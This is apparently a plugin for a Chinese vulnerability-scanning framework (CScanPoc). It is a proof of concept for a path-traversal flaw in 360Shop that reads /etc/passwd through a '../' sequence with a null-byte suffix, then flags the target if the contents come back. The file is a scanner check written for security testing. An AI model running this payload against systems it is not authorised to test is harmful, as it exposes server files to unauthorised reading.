# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '360Shop_0000'  # 平台漏洞编号，留空
    name = '启博淘店通标准版 任意文件遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2016-01-19'  # 漏洞公布时间
    desc = '''
        启博淘店通标准版 /?mod=goods&do=../../../../../../../../../etc/passwd%00.jpg&class_id=25 任意文件遍历漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0148274'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '360Shop(启博微分销)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '46387b19-2441-4966-881d-4b31ec2a2b40'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = arg + "/?mod=goods&do=../../../../../../../../../etc/passwd%00.jpg&class_id=25"
            code, head, res, errcode, _ = hh.http(payload)
            if code == 200 and 'bin/bash' in res and "root" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n任意文件遍历漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=payload))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
